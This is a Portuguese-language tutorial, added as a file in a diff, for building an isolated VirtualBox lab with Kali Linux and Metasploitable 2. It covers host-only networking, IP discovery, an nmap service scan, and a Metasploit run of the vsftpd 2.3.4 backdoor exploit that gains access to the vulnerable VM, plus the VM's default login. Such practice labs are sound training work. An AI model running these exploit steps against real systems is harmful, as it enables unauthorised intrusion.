@@ -1,0 +1,93 @@
+🔧 1. Criar a rede Host-Only no VirtualBox
+Abra o VirtualBox
+
+Vá em:
+
+Arquivo → Ferramentas → Gerenciador de Rede Host-Only
+Clique em Criar
+Configure algo assim:
+IP: 192.168.56.1
+Máscara: 255.255.255.0
+(Opcional) Ative o DHCP ou deixe manual (melhor para estudo)
+🖥️ 2. Configurar as VMs
+🔴 Kali Linux
+Vá em Configurações → Rede
+Adaptador 1:
+Tipo: Host-only Adapter
+Nome: vboxnet0 (ou o que você criou)
+🔵 Metasploitable 2
+
+Mesma coisa:
+
+Configurações → Rede
+Adaptador 1:
+Tipo: Host-only Adapter
+Nome: vboxnet0
+⚡ 3. Iniciar as máquinas
+
+Ligue primeiro:
+
+Metasploitable 2
+Depois Kali
+🌐 4. Descobrir IPs
+No Metasploitable:
+
+Login:
+
+usuario: msfadmin
+senha: msfadmin
+
+Digite:
+
+ifconfig
+
+Procure algo tipo:
+
+inet addr:192.168.56.X
+No Kali:
+
+Digite:
+
+ip a
+
+Você deve ver algo como:
+
+192.168.56.Y
+🔗 5. Testar conexão
+
+No Kali:
+
+ping 192.168.56.X
+
+Se responder → ✅ está funcionando
+
+🔍 6. Teste de pentest básico
+
+No Kali:
+
+nmap -sV 192.168.56.X
+
+Isso vai listar serviços vulneráveis do Metasploitable.
+
+💥 7. Exemplo com Metasploit
+
+Abra:
+
+msfconsole
+
+Depois:
+
+search vsftpd
+use exploit/unix/ftp/vsftpd_234_backdoor
+set RHOST 192.168.56.X
+run
+
+Se tudo estiver certo → acesso ao sistema vulnerável.
+
+⚠️ Dicas importantes
+❌ NÃO conecte o Metasploitable à internet
+✔️ Use apenas rede isolada
+✔️ Ideal pra aprender:
+exploração
+enumeração
+pós-exploração
